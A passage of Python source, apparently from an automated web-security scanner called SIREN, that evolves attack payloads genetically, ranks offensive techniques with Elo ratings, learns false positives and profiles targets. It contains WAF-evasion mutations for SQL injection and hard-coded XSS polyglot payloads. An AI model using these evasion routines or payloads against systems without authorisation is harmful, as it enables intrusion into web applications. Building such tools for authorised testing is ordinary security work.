                    result.append(f"%25{ord(c):02X}")
                else:
                    result.append(c)
            return "".join(result)
        elif op == MutationType.COMMENT_INJECTION:
            # Insert SQL/HTML comments at random positions
            comments = ["/**/", "/*!*/", "/**_**/"]
            pos = random.randint(0, max(0, len(payload) - 1))
            comment = random.choice(comments)
            return payload[:pos] + comment + payload[pos:]
        elif op == MutationType.WHITESPACE_SUB:
            subs = {" ": ["\t", "\n", "\r\n", "\x0b", "\x0c", "+"]}
            result = []
            for c in payload:
                if c in subs and random.random() < 0.3:
                    result.append(random.choice(subs[c]))
                else:
                    result.append(c)
            return "".join(result)
        elif op == MutationType.CONCAT_SPLIT:
            # Split string literals with concatenation
            if "'" in payload:
                pos = payload.index("'")
                next_q = payload.find("'", pos + 1)
                if next_q > pos:
                    mid = (pos + next_q) // 2
                    return payload[:mid] + "'||'" + payload[mid:]
            return payload
        elif op == MutationType.UNICODE_HOMOGLYPH:
            homoglyphs = {
                "a": "\u0430", "e": "\u0435", "o": "\u043e",
                "p": "\u0440", "c": "\u0441", "x": "\u0445",
            }
            result = []
            for c in payload:
                if c.lower() in homoglyphs and random.random() < 0.15:
                    result.append(homoglyphs[c.lower()])
                else:
                    result.append(c)
            return "".join(result)
        elif op == MutationType.NULL_BYTE:
            pos = random.randint(0, max(0, len(payload) - 1))
            return payload[:pos] + "%00" + payload[pos:]
        elif op == MutationType.NESTED_PAYLOAD:
            # Nest payload inside itself
            if len(payload) > 10:
                mid = len(payload) // 2
                return payload[:mid] + payload + payload[mid:]
            return payload + payload
        elif op == MutationType.BOUNDARY_EXPAND:
            # Replace numbers with boundary values
            import re
            def replace_num(m: Any) -> str:
                choices = ["0", "-1", "99999999", "2147483647", "-2147483648"]
                return random.choice(choices)
            return re.sub(r"\d+", replace_num, payload)
        elif op == MutationType.POLYGLOT:
            polyglots = [
                "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//",
                "'-var x=1;alert(x)-'",
                "\";alert(1)//",
            ]
            return random.choice(polyglots) if random.random() < 0.3 else payload
        elif op == MutationType.SEMANTIC_EQUIV:
            # SQL semantic equivalents
            equiv_map = {
                " OR ": [" || ", " OOOR "],
                "SELECT": ["SeLeCt", "select"],
                "UNION": ["UnIoN", "union"],
                "1=1": ["2=2", "3=3", "'a'='a'"],
                "AND": ["AnD", "&&"],
            }
            result = payload
            for original, replacements in equiv_map.items():
                if original in result.upper():
                    idx = result.upper().find(original)
                    result = (
                        result[:idx]
                        + random.choice(replacements)
                        + result[idx + len(original):]
                    )
                    break
            return result
        return payload

    @staticmethod
    def _crossover(parent_a: str, parent_b: str) -> str:
        """Single-point crossover between two payload strings."""
        if not parent_a or not parent_b:
            return parent_a or parent_b
        point_a = random.randint(0, len(parent_a) - 1)
        point_b = random.randint(0, len(parent_b) - 1)
        return parent_a[:point_a] + parent_b[point_b:]

    @staticmethod
    def _tournament_select(population: List[PayloadGene], k: int = 3) -> PayloadGene:
        """Tournament selection: pick best of k random individuals."""
        candidates = random.sample(population, min(k, len(population)))
        return max(candidates, key=lambda g: g.fitness)

    def _create_gene(
        self,
        raw: str,
        category: TechniqueCategory,
        gen: int = 0,
        parents: Optional[List[str]] = None,
        mutations: Optional[List[MutationType]] = None,
    ) -> PayloadGene:
        """Create a new PayloadGene with unique ID."""
        self._gene_counter += 1
        pid = hashlib.md5(
            f"{raw}_{self._gene_counter}_{time.time()}".encode()
        ).hexdigest()[:12]
        return PayloadGene(
            payload_id=pid,
            raw=raw,
            category=category,
            mutations_applied=mutations or [],
            generation=gen,
            parent_ids=parents or [],
        )

    def to_dict(self) -> Dict[str, Any]:
        with self._lock:
            return {
                "populations": {
                    cat: [g.to_dict() for g in genes]
                    for cat, genes in self._populations.items()
                },
                "generations": dict(self._generation),
                "gene_counter": self._gene_counter,
                "config": {
                    "population_size": self._population_size,
                    "mutation_rate": self._mutation_rate,
                    "crossover_rate": self._crossover_rate,
                    "elite_fraction": self._elite_fraction,
                },
            }

    @classmethod
    def from_dict(cls, d: Dict[str, Any]) -> PayloadEvolver:
        cfg = d.get("config", {})
        obj = cls(
            population_size=cfg.get("population_size", POPULATION_SIZE),
            mutation_rate=cfg.get("mutation_rate", MUTATION_RATE),
            crossover_rate=cfg.get("crossover_rate", CROSSOVER_RATE),
            elite_fraction=cfg.get("elite_fraction", ELITE_FRACTION),
        )
        obj._gene_counter = d.get("gene_counter", 0)
        obj._generation = defaultdict(int, d.get("generations", {}))
        for cat, genes_data in d.get("populations", {}).items():
            obj._populations[cat] = [PayloadGene.from_dict(g) for g in genes_data]
        return obj


# ════════════════════════════════════════════════════════════════════════════════
# TECHNIQUE RANKER — ELO rating system for offensive techniques
# ════════════════════════════════════════════════════════════════════════════════

class TechniqueRanker:
    """
    Maintains Elo ratings for every technique, contextualized by target profile.

    When two techniques are tried on the same target, the one that succeeds
    "wins" the matchup. Over time, this produces a reliable ranking of
    which techniques work best in which contexts.

    Also supports context-specific ratings: tech_id@context_hash
    """

    def __init__(self, k_factor: float = ELO_K_FACTOR) -> None:
        self._lock = threading.RLock()
        self._k = k_factor
        # technique_id -> Elo rating
        self._ratings: Dict[str, float] = defaultdict(lambda: ELO_DEFAULT_RATING)
        # technique_id -> games played
        self._games: Dict[str, int] = defaultdict(int)
        # Match history for audit
        self._history: Deque[Dict[str, Any]] = deque(maxlen=10_000)

    def record_matchup(
        self,
        winner_id: str,
        loser_id: str,
        context: str = "",
        margin: float = 1.0,
    ) -> Tuple[float, float]:
        """
        Record a technique matchup result.

        Args:
            winner_id: Technique that succeeded.
            loser_id: Technique that failed.
            context: Optional context hash for context-specific ratings.
            margin: [0, 1] strength of win. 1.0 = clear win, 0.5 = marginal.

        Returns:
            (new_winner_rating, new_loser_rating)
        """
        with self._lock:
            w_key = f"{winner_id}@{context}" if context else winner_id
            l_key = f"{loser_id}@{context}" if context else loser_id

            r_w = self._ratings[w_key]
            r_l = self._ratings[l_key]

            # Expected scores (logistic model)
            e_w = 1.0 / (1.0 + 10.0 ** ((r_l - r_w) / 400.0))
            e_l = 1.0 - e_w

            # Actual scores
            s_w = 0.5 + 0.5 * margin  # [0.5, 1.0]
            s_l = 1.0 - s_w

            # Update ratings
            new_r_w = r_w + self._k * (s_w - e_w)
            new_r_l = r_l + self._k * (s_l - e_l)

            self._ratings[w_key] = new_r_w
            self._ratings[l_key] = new_r_l
            self._games[w_key] = self._games.get(w_key, 0) + 1
            self._games[l_key] = self._games.get(l_key, 0) + 1

            self._history.append({
                "winner": w_key,
                "loser": l_key,
                "margin": margin,
                "new_ratings": (new_r_w, new_r_l),
                "timestamp": time.time(),
            })

            # Also update global (non-context) ratings
            if context:
                g_r_w = self._ratings[winner_id]
                g_r_l = self._ratings[loser_id]
                g_e_w = 1.0 / (1.0 + 10.0 ** ((g_r_l - g_r_w) / 400.0))
                # Damped global update (half K-factor for context-derived signal)
                self._ratings[winner_id] = g_r_w + (self._k / 2) * (s_w - g_e_w)
                self._ratings[loser_id] = g_r_l + (self._k / 2) * (s_l - (1 - g_e_w))

            return (new_r_w, new_r_l)

    def record_solo(
        self,
        technique_id: str,
        success: bool,
        context: str = "",
    ) -> float:
        """Record a solo technique attempt (win/loss against virtual baseline)."""
        with self._lock:
            key = f"{technique_id}@{context}" if context else technique_id
            r = self._ratings[key]
            # Virtual opponent at default rating
            e = 1.0 / (1.0 + 10.0 ** ((ELO_DEFAULT_RATING - r) / 400.0))
            s = 1.0 if success else 0.0
            new_r = r + self._k * (s - e)
            self._ratings[key] = new_r
            self._games[key] = self._games.get(key, 0) + 1
            return new_r

    def get_ranking(
        self,
        context: str = "",
        top_n: int = 20,
    ) -> List[Tuple[str, float, int]]:
        """
        Get ranked techniques.

        Returns: [(technique_id, rating, games_played), ...]
        """
        with self._lock:
            filtered: List[Tuple[str, float, int]] = []
            for key, rating in self._ratings.items():
                if context:
                    if key.endswith(f"@{context}"):
                        technique = key.rsplit("@", 1)[0]
                        filtered.append((technique, rating, self._games.get(key, 0)))
                else:
                    if "@" not in key:
                        filtered.append((key, rating, self._games.get(key, 0)))

            filtered.sort(key=lambda x: x[1], reverse=True)
            return filtered[:top_n]

    def get_rating(self, technique_id: str, context: str = "") -> float:
        """Get current rating for a technique."""
        with self._lock:
            key = f"{technique_id}@{context}" if context else technique_id
            return self._ratings.get(key, ELO_DEFAULT_RATING)

    def predict_win_probability(
        self, technique_a: str, technique_b: str, context: str = ""
    ) -> float:
        """Predict probability that technique_a beats technique_b."""
        with self._lock:
            key_a = f"{technique_a}@{context}" if context else technique_a
            key_b = f"{technique_b}@{context}" if context else technique_b
            r_a = self._ratings.get(key_a, ELO_DEFAULT_RATING)
            r_b = self._ratings.get(key_b, ELO_DEFAULT_RATING)
            return 1.0 / (1.0 + 10.0 ** ((r_b - r_a) / 400.0))

    def to_dict(self) -> Dict[str, Any]:
        with self._lock:
            return {
                "ratings": dict(self._ratings),
                "games": dict(self._games),
                "k_factor": self._k,
                "history_size": len(self._history),
            }

    @classmethod
    def from_dict(cls, d: Dict[str, Any]) -> TechniqueRanker:
        obj = cls(k_factor=d.get("k_factor", ELO_K_FACTOR))
        for k, v in d.get("ratings", {}).items():
            obj._ratings[k] = v
        for k, v in d.get("games", {}).items():
            obj._games[k] = v
        return obj


# ════════════════════════════════════════════════════════════════════════════════
# FALSE POSITIVE LEARNER — Distinguish TP from FP by signature
# ════════════════════════════════════════════════════════════════════════════════

class FalsePositiveLearner:
    """
    Learns to recognize false positive patterns from analyst feedback.

    Builds a library of FP signatures based on:
    - Response code + body patterns
    - Target context (technology, endpoint patterns)
    - Technique + response size combination
    - Temporal patterns (always appears, always disappears)

    Uses exponential decay to down-weight old signals.
    """

    def __init__(self) -> None:
        self._lock = threading.RLock()
        self._signatures: Dict[str, FPSignature] = {}
        self._pending_reviews: Deque[TechniqueRecord] = deque(maxlen=1000)
        # technique -> response_hash -> count
        self._response_clusters: Dict[str, Dict[str, int]] = defaultdict(
            lambda: defaultdict(int)
        )
        self._total_fps_confirmed = 0
        self._total_tps_confirmed = 0

    def report_false_positive(self, record: TechniqueRecord) -> FPSignature:
        """
        Analyst confirms a finding is a false positive.
        Creates or updates FP signature.
        """
        with self._lock:
            self._total_fps_confirmed += 1
            sig_hash = self._compute_signature_hash(record)
            existing = self._signatures.get(sig_hash)

            if existing:
                existing.observations += 1
                existing.confidence = min(0.99, existing.confidence + 0.05)
                existing.last_seen = time.time()
                return existing

            sig = FPSignature(
                signature_id=sig_hash,
                technique_id=record.technique_id,
                pattern_hash=sig_hash,
                response_code=record.response_code,
                response_body_pattern=self._extract_body_pattern(record.evidence),
                response_size_range=(
                    max(0, record.response_size - 100),
                    record.response_size + 100,
                ),
                target_context_match=self._extract_context_keys(record.target_context),
                confidence=0.6,
                observations=1,
            )
            self._signatures[sig_hash] = sig
            return sig

    def report_true_positive(self, record: TechniqueRecord) -> None:
        """Analyst confirms a finding is a true positive — reduce matching FP signatures."""
        with self._lock:
            self._total_tps_confirmed += 1
            sig_hash = self._compute_signature_hash(record)
            existing = self._signatures.get(sig_hash)
            if existing:
                existing.confidence *= FP_DECAY_FACTOR
                if existing.confidence < 0.1:
                    del self._signatures[sig_hash]

    def check_false_positive(self, record: TechniqueRecord) -> Tuple[bool, float]:
        """
        Check if a technique record matches known FP patterns.
        Applies temporal decay via FP_DECAY_FACTOR to down-weight old signatures.

        Returns: (is_likely_fp, confidence)
        """
        with self._lock:
            best_score = 0.0
            now = time.time()
            for sig in self._signatures.values():
                if sig.technique_id != record.technique_id:
                    continue
                score = sig.matches(record)
                # Apply temporal decay based on days since last observation
                days_since_observation = (now - sig.last_seen) / 86400.0
                score *= FP_DECAY_FACTOR ** days_since_observation
                if score > best_score:
                    best_score = score

            is_fp = best_score > 0.6
            return (is_fp, best_score)

    def auto_detect_fps(
        self, records: List[TechniqueRecord], threshold: int = 3
    ) -> List[TechniqueRecord]:
        """
        Auto-detect potential FPs by clustering identical responses.
        If the same technique produces the same response hash N+ times
        across different targets, it's likely an FP pattern.
        """
        with self._lock:
            # Cluster by technique + response hash
            clusters: Dict[str, List[TechniqueRecord]] = defaultdict(list)
            for rec in records:
                resp_hash = hashlib.md5(
                    f"{rec.technique_id}:{rec.response_code}:{rec.response_size}".encode()
                ).hexdigest()[:16]
                clusters[resp_hash].append(rec)
                self._response_clusters[rec.technique_id][resp_hash] += 1

            suspects: List[TechniqueRecord] = []
            for cluster_id, cluster_records in clusters.items():
                if len(cluster_records) >= threshold:
                    # All same response = likely FP
                    targets = set()
                    for r in cluster_records:
                        targets.add(json.dumps(r.target_context, sort_keys=True))
                    if len(targets) >= threshold:
                        suspects.extend(cluster_records)

            return suspects

    def get_fp_rate(self) -> float:
        """Get overall false positive rate from confirmed reports."""
        total = self._total_fps_confirmed + self._total_tps_confirmed
        if total == 0:
            return 0.0
        return self._total_fps_confirmed / total

    def get_signatures(self) -> List[FPSignature]:
        """Get all FP signatures sorted by confidence."""
        with self._lock:
            sigs = list(self._signatures.values())
            sigs.sort(key=lambda s: s.confidence, reverse=True)
            return sigs

    @staticmethod
    def _compute_signature_hash(record: TechniqueRecord) -> str:
        """Compute a hash representing the FP pattern signature."""
        key = f"{record.technique_id}:{record.response_code}:{record.response_size // 100}"
        return hashlib.sha256(key.encode()).hexdigest()[:16]

    @staticmethod
    def _extract_body_pattern(evidence: str) -> str:
        """Extract a generalizable pattern from response body."""
        if not evidence:
            return ""
        # Take first 200 chars as pattern
        return evidence[:200].strip()

    @staticmethod
    def _extract_context_keys(ctx: Dict[str, Any]) -> Dict[str, str]:
        """Extract stable context keys for matching."""
        keys: Dict[str, str] = {}
        for k in ("server", "framework", "waf_type", "technology"):
            if k in ctx and ctx[k]:
                keys[k] = str(ctx[k]).lower()
        return keys

    def to_dict(self) -> Dict[str, Any]:
        with self._lock:
            return {
                "signatures": {
                    k: {
                        "signature_id": v.signature_id,
                        "technique_id": v.technique_id,
                        "pattern_hash": v.pattern_hash,
                        "response_code": v.response_code,
                        "response_body_pattern": v.response_body_pattern,
                        "response_size_range": list(v.response_size_range),
                        "target_context_match": v.target_context_match,
                        "confidence": v.confidence,
                        "observations": v.observations,
                    }
                    for k, v in self._signatures.items()
                },
                "total_fps": self._total_fps_confirmed,
                "total_tps": self._total_tps_confirmed,
            }

    @classmethod
    def from_dict(cls, d: Dict[str, Any]) -> FalsePositiveLearner:
        obj = cls()
        obj._total_fps_confirmed = d.get("total_fps", 0)
        obj._total_tps_confirmed = d.get("total_tps", 0)
        for k, v in d.get("signatures", {}).items():
            obj._signatures[k] = FPSignature(
                signature_id=v["signature_id"],
                technique_id=v["technique_id"],
                pattern_hash=v["pattern_hash"],
                response_code=v.get("response_code", 0),
                response_body_pattern=v.get("response_body_pattern", ""),
                response_size_range=tuple(v.get("response_size_range", [0, 0])),
                target_context_match=v.get("target_context_match", {}),
                confidence=v.get("confidence", 0.5),
                observations=v.get("observations", 0),
            )
        return obj


# ════════════════════════════════════════════════════════════════════════════════
# TARGET PROFILER — Fingerprint & clustering of targets
# ════════════════════════════════════════════════════════════════════════════════

class TargetProfiler:
    """
    Builds and clusters target profiles to transfer learnings.

    If target A is similar to target B, and technique X worked on A,
    it's likely to work on B too. This enables:
    - Cross-target technique transfer
    - Archetype-based strategy selection
    - Smart scan ordering based on similar past targets
    """

    # Feature extraction keys and default values
    FEATURE_KEYS: List[str] = [
        "has_waf", "has_cdn", "uses_https", "has_api",
        "has_auth", "response_time_ms", "avg_response_size",
        "error_rate", "num_endpoints", "num_parameters",
        "tech_complexity", "age_days", "is_cloud",
        "has_websocket", "has_graphql", "has_cors",
    ]

    def __init__(self, similarity_threshold: float = PROFILE_SIMILARITY_THRESHOLD) -> None:
        self._lock = threading.RLock()
        self._profiles: Dict[str, TargetProfile] = {}
        self._similarity_threshold = similarity_threshold
        # Cached similarity matrix: (profile_a, profile_b) -> similarity
        self._sim_cache: Dict[Tuple[str, str], float] = {}

    def create_profile(
        self,
        profile_id: str,
        technologies: Optional[Set[str]] = None,
        waf_type: str = "",
        features: Optional[Dict[str, float]] = None,
    ) -> TargetProfile:
        """Create or update a target profile."""
        with self._lock:
            existing = self._profiles.get(profile_id)
            if existing:
                if technologies:
                    existing.technologies.update(technologies)
                if waf_type:
                    existing.waf_type = waf_type
                if features:
                    existing.features.update(features)
                existing.last_seen = time.time()
                existing.scan_count += 1
                self._sim_cache.clear()
                return existing

            profile = TargetProfile(
                profile_id=profile_id,
                technologies=technologies or set(),
                waf_type=waf_type,
                features=features or {},
            )
            self._profiles[profile_id] = profile
            self._sim_cache.clear()
            return profile

    def extract_features(
        self,
        scan_data: Dict[str, Any],
    ) -> Dict[str, float]:
        """Extract normalized feature vector from scan data."""
        features: Dict[str, float] = {}
        features["has_waf"] = 1.0 if scan_data.get("waf_detected") else 0.0
        features["has_cdn"] = 1.0 if scan_data.get("cdn_detected") else 0.0
        features["uses_https"] = 1.0 if scan_data.get("uses_https") else 0.0
        features["has_api"] = 1.0 if scan_data.get("has_api") else 0.0
        features["has_auth"] = 1.0 if scan_data.get("has_auth") else 0.0
        features["has_websocket"] = 1.0 if scan_data.get("has_websocket") else 0.0
        features["has_graphql"] = 1.0 if scan_data.get("has_graphql") else 0.0
        features["has_cors"] = 1.0 if scan_data.get("cors_configured") else 0.0
        features["is_cloud"] = 1.0 if scan_data.get("is_cloud") else 0.0

        # Normalize continuous features to 0-1
        rt = scan_data.get("avg_response_time_ms", 200)
        features["response_time_ms"] = min(1.0, rt / 5000.0)

        rs = scan_data.get("avg_response_size", 5000)
        features["avg_response_size"] = min(1.0, rs / 100000.0)

        er = scan_data.get("error_rate", 0.0)
        features["error_rate"] = min(1.0, er)

        ep = scan_data.get("num_endpoints", 10)
        features["num_endpoints"] = min(1.0, ep / 200.0)

        params = scan_data.get("num_parameters", 20)
        features["num_parameters"] = min(1.0, params / 500.0)

        techs = len(scan_data.get("technologies", []))
        features["tech_complexity"] = min(1.0, techs / 15.0)

        age = scan_data.get("domain_age_days", 365)
        features["age_days"] = min(1.0, age / 3650.0)

        return features

    def find_similar(
        self, profile_id: str, top_n: int = 5
    ) -> List[Tuple[str, float]]:
        """Find most similar profiles to the given one."""
        with self._lock:
            target = self._profiles.get(profile_id)
            if not target:
                return []

            target_vec = target.feature_vector()
            if not target_vec:
                return []

            similarities: List[Tuple[str, float]] = []
            for pid, profile in self._profiles.items():
                if pid == profile_id:
                    continue
                vec = profile.feature_vector()
                if len(vec) != len(target_vec):
                    continue
                sim = self._cosine_similarity(target_vec, vec)
                cache_key = tuple(sorted([profile_id, pid]))
                self._sim_cache[cache_key] = sim
                if sim >= self._similarity_threshold:
                    similarities.append((pid, sim))

            similarities.sort(key=lambda x: x[1], reverse=True)

            # Update profile with similar profiles
            target.similar_profiles = [s[0] for s in similarities[:top_n]]
            return similarities[:top_n]

    def infer_archetype(self, profile_id: str) -> Optional[TargetArchetype]:
        """Infer target archetype from features using rule-based classification."""
        with self._lock:
            profile = self._profiles.get(profile_id)
            if not profile:
                return None

            f = profile.features
            techs = {t.lower() for t in profile.technologies}

            # Rule-based archetype inference
            if "wordpress" in techs or "wp" in techs:
                archetype = TargetArchetype.WORDPRESS_CMS
            elif f.get("has_graphql", 0) > 0.5 or f.get("has_api", 0) > 0.5:
                if f.get("is_cloud", 0) > 0.5:
                    archetype = TargetArchetype.CLOUD_NATIVE
                else:
                    archetype = TargetArchetype.API_MICROSERVICE
            elif any(t in techs for t in ("shopify", "magento", "woocommerce", "prestashop")):
                archetype = TargetArchetype.ECOMMERCE
            elif f.get("tech_complexity", 0) < 0.2 and f.get("age_days", 0) > 0.5:
                archetype = TargetArchetype.LEGACY_MONOLITH
            elif any(t in techs for t in ("express", "fastapi", "flask", "gin", "fiber")):
                archetype = TargetArchetype.API_MICROSERVICE
            elif f.get("is_cloud", 0) > 0.5:
                archetype = TargetArchetype.CLOUD_NATIVE
            elif any(t in techs for t in ("hl7", "fhir", "dicom")):
                archetype = TargetArchetype.HEALTHCARE_APP
            elif any(t in techs for t in ("swift", "plaid", "stripe")):
                archetype = TargetArchetype.FINANCIAL_APP
            elif any(t in techs for t in ("mqtt", "coap", "zigbee", "embedded")):
                archetype = TargetArchetype.IOT_EMBEDDED
            else:
                archetype = TargetArchetype.CORPORATE_WEBAPP

            profile.archetype = archetype
            return archetype

    def transfer_learnings(
        self, from_profile_id: str, to_profile_id: str
    ) -> List[Tuple[str, float]]:
        """
        Transfer technique recommendations from a completed profile
        to a new similar profile.

        Returns: [(technique_id, expected_success_rate), ...]
        """
        with self._lock:
            source = self._profiles.get(from_profile_id)
            if not source:
                return []

            recommendations: List[Tuple[str, float]] = []
            for tech_id, outcomes in source.technique_outcomes.items():
                if not outcomes:
                    continue
                success_count = sum(
                    1 for o in outcomes
                    if o in (OutcomeType.SUCCESS, OutcomeType.PARTIAL)
                )
                rate = success_count / len(outcomes)
                if rate > 0.3:  # Only transfer techniques with >30% success
                    recommendations.append((tech_id, rate))

            recommendations.sort(key=lambda x: x[1], reverse=True)
            return recommendations

    def record_technique_outcome(
        self, profile_id: str, technique_id: str, outcome: OutcomeType
    ) -> None:
        """Record a technique outcome for a profile."""
        with self._lock:
            profile = self._profiles.get(profile_id)
            if profile:
                profile.technique_outcomes.setdefault(technique_id, []).append(outcome)

    @staticmethod
    def _cosine_similarity(a: List[float], b: List[float]) -> float:
        """Compute cosine similarity between two vectors."""
        if len(a) != len(b) or not a:
            return 0.0
        dot = sum(x * y for x, y in zip(a, b))
        norm_a = math.sqrt(sum(x * x for x in a))
        norm_b = math.sqrt(sum(x * x for x in b))
        if norm_a < 1e-10 or norm_b < 1e-10:
            return 0.0
        return dot / (norm_a * norm_b)

    def to_dict(self) -> Dict[str, Any]:
        with self._lock:
            return {
                "profiles": {
                    k: v.to_dict() for k, v in self._profiles.items()
                },
                "similarity_threshold": self._similarity_threshold,
            }

    @classmethod
    def from_dict(cls, d: Dict[str, Any]) -> TargetProfiler:
        obj = cls(similarity_threshold=d.get("similarity_threshold", PROFILE_SIMILARITY_THRESHOLD))
        for k, v in d.get("profiles", {}).items():
            obj._profiles[k] = TargetProfile.from_dict(v)
        return obj


# ════════════════════════════════════════════════════════════════════════════════
# EVOLUTION DB — Persistence layer (stdlib JSON, no SQLite dependency)
# ════════════════════════════════════════════════════════════════════════════════

class EvolutionDB:
    """
    Persistent storage for all evolution data.

    Uses atomic JSON file writes for crash safety.
    Supports incremental saves and full state restoration.
    """

    def __init__(self, db_path: Optional[Path] = None) -> None:
        self._lock = threading.RLock()
        self._db_path = db_path or Path.home() / ".siren" / "evolution_db.json"
        self._data: Dict[str, Any] = {}
        self._dirty = False
        self._save_counter = 0
        self._auto_save_interval = 100  # Save every N operations

    def save_component(self, key: str, data: Dict[str, Any]) -> None:
        """Save a component's state."""
        with self._lock:
            self._data[key] = data
            self._data["_meta"] = {
                "last_save": time.time(),
                "version": "1.0.0",
                "save_count": self._save_counter,
            }
            self._dirty = True
            self._save_counter += 1
            if self._save_counter % self._auto_save_interval == 0:
                self._write_to_disk()

    def load_component(self, key: str) -> Optional[Dict[str, Any]]:
        """Load a component's state."""
        with self._lock:
            if not self._data:
                self._read_from_disk()
            return self._data.get(key)

    def flush(self) -> None:
        """Force write all pending changes to disk."""
        with self._lock:
            if self._dirty:
                self._write_to_disk()

    def get_metadata(self) -> Dict[str, Any]:
        """Get DB metadata."""
        with self._lock:
            return self._data.get("_meta", {})

    def clear(self) -> None:
        """Clear all data (in memory only — call flush to persist)."""
        with self._lock:
            self._data.clear()
            self._dirty = True

    def _write_to_disk(self) -> None:
        """Atomic write: write to temp file, then rename."""
        try:
            self._db_path.parent.mkdir(parents=True, exist_ok=True)
            tmp_path = self._db_path.with_suffix(".tmp")
            with open(tmp_path, "w", encoding="utf-8") as f:
                json.dump(self._data, f, indent=2, default=str)
            # Atomic rename (on POSIX; on Windows, this replaces)
            if os.name == "nt":
                # Windows: need to remove target first
                if self._db_path.exists():
                    self._db_path.unlink()
            tmp_path.rename(self._db_path)
            self._dirty = False
            logger.debug("EvolutionDB saved to %s", self._db_path)
        except OSError as e:
            logger.error("Failed to save EvolutionDB: %s", e)

    def _read_from_disk(self) -> None:
        """Read state from disk."""
        try:
            if self._db_path.exists():
                with open(self._db_path, "r", encoding="utf-8") as f:
                    self._data = json.load(f)
                logger.info(
                    "EvolutionDB loaded from %s (%d keys)",
                    self._db_path,
                    len(self._data),
                )
            else:
                self._data = {}
        except (OSError, json.JSONDecodeError) as e:
            logger.error("Failed to load EvolutionDB: %s", e)
            self._data = {}


# ════════════════════════════════════════════════════════════════════════════════
# SIREN SELF-EVOLUTION — Main orchestrator
# ════════════════════════════════════════════════════════════════════════════════

class SirenSelfEvolution:
    """
    Main orchestrator for SIREN's self-evolution system.

    Coordinates all learning subsystems:
    - PatternLearner for cross-scan pattern detection
    - StrategyOptimizer for multi-armed bandit strategy selection
    - PayloadEvolver for genetic payload evolution
    - TechniqueRanker for Elo-based technique ranking
    - FalsePositiveLearner for FP pattern recognition
    - TargetProfiler for target clustering & learning transfer

    Thread-safe, persistent, and designed for continuous operation.
    """

    def __init__(
        self,
        db_path: Optional[Path] = None,
        auto_persist: bool = True,
    ) -> None:
        self._lock = threading.RLock()
        self._db = EvolutionDB(db_path)
        self._auto_persist = auto_persist
        self._executor = ThreadPoolExecutor(
            max_workers=THREAD_POOL_SIZE,
            thread_name_prefix="siren-evolution",
        )

        # Initialize all subsystems
        self.pattern_learner = PatternLearner()
        self.strategy_optimizer = StrategyOptimizer()
        self.payload_evolver = PayloadEvolver()
        self.technique_ranker = TechniqueRanker()
        self.fp_learner = FalsePositiveLearner()
        self.target_profiler = TargetProfiler()

        # Stats
        self._total_signals = 0
        self._started_at = time.time()

        # Try to load persisted state
        self._load_state()

    def process_scan_result(
        self,
        technique_id: str,
        category: str,
        outcome: str,
        target_context: Dict[str, Any],
        payload: str = "",
        response_code: int = 0,
        response_size: int = 0,
        duration_ms: float = 0.0,
        waf_detected: bool = False,
        waf_type: str = "",
        evidence: str = "",
        confidence: float = 0.0,
        scan_id: str = "",
        profile_id: str = "",
    ) -> Dict[str, Any]:
        """
        Process a single scan result through ALL learning subsystems.

        This is the main entry point for feeding data into the evolution system.
        Returns a dict of learning signals produced.
        """
        with self._lock:
            self._total_signals += 1

            # Build technique record
            cat = TechniqueCategory[category] if category in TechniqueCategory.__members__ else TechniqueCategory.INJECTION
            out = OutcomeType[outcome] if outcome in OutcomeType.__members__ else OutcomeType.FAILURE
            record = TechniqueRecord(
                technique_id=technique_id,
                category=cat,
                target_context=target_context,
                outcome=out,
                duration_ms=duration_ms,
                payload_used=payload,
                response_code=response_code,
                response_size=response_size,
                waf_detected=waf_detected,
                waf_type=waf_type,
                evidence=evidence,
                confidence=confidence,
                scan_id=scan_id,
            )

            signals: Dict[str, Any] = {"technique_id": technique_id}

            # 1) Pattern Learner
            self.pattern_learner.record_outcome(record)
            signals["pattern_recorded"] = True

            # 2) Strategy Optimizer
            arm_id = f"{category}:{target_context.get('server', 'unknown')}"
            self.strategy_optimizer.register_arm(arm_id)
            reward = {
                OutcomeType.SUCCESS: 1.0,
                OutcomeType.PARTIAL: 0.6,
                OutcomeType.FAILURE: 0.0,
                OutcomeType.BLOCKED: 0.1,
                OutcomeType.ERROR: 0.0,
                OutcomeType.FALSE_POSITIVE: 0.0,
            }.get(out, 0.0)
            self.strategy_optimizer.update(arm_id, reward)
            signals["strategy_arm"] = arm_id
            signals["strategy_reward"] = reward

            # 3) Technique Ranker
            is_success = out in (OutcomeType.SUCCESS, OutcomeType.PARTIAL)
            new_rating = self.technique_ranker.record_solo(
                technique_id, is_success, context=profile_id
            )
            signals["technique_rating"] = new_rating

            # 4) Payload Evolver — record if payload provided
            if payload and category in self.payload_evolver._populations:
                for gene in self.payload_evolver._populations[category]:
                    if gene.raw == payload:
                        self.payload_evolver.record_result(
                            gene.payload_id,
                            category,
                            is_success,
                            bypassed_waf=waf_detected and out != OutcomeType.BLOCKED,
                            response_time_ms=duration_ms,
                            context=target_context.get("server", ""),
                        )
                        signals["payload_gene_updated"] = gene.payload_id
                        break

            # 5) FP Check
            is_fp, fp_confidence = self.fp_learner.check_false_positive(record)
            signals["fp_check"] = {"likely_fp": is_fp, "fp_confidence": fp_confidence}

            # 6) Target Profiler
            if profile_id:
                self.target_profiler.record_technique_outcome(
                    profile_id, technique_id, out
                )
                signals["profile_updated"] = profile_id

            # Auto-persist
            if self._auto_persist and self._total_signals % 50 == 0:
                self._save_state()

            return signals

    def get_recommendations(
        self,
        target_context: Dict[str, Any],
        profile_id: str = "",
        available_techniques: Optional[List[str]] = None,
    ) -> Dict[str, Any]:
        """
        Get intelligent recommendations for next scan actions.

        Returns a comprehensive set of recommendations from all subsystems.
        """
        with self._lock:
            recs: Dict[str, Any] = {}

            # 1) Best techniques for tech stack
            techs = target_context.get("technologies", [])
            if isinstance(techs, list):
                for tech in techs[:3]:
                    best = self.pattern_learner.get_best_techniques_for_tech(str(tech))
                    if best:
                        recs.setdefault("tech_recommendations", {})[str(tech)] = best

            # 2) Strategy selection
            if available_techniques:
                arms = [
                    f"{t}:{target_context.get('server', 'unknown')}"
                    for t in available_techniques
                ]
                self.strategy_optimizer.register_arms_bulk(arms)
                selected = self.strategy_optimizer.select_hybrid(arms)
                recs["selected_strategy"] = selected

            # 3) Technique ranking
            ranking = self.technique_ranker.get_ranking(
                context=profile_id, top_n=10
            )
            recs["technique_ranking"] = [
                {"technique": t, "rating": r, "games": g}
                for t, r, g in ranking
            ]

            # 4) WAF evasion
            waf = target_context.get("waf_type", "")
            if waf:
                evasion = self.pattern_learner.get_waf_evasion_recommendations(waf)
                recs["waf_evasion"] = evasion

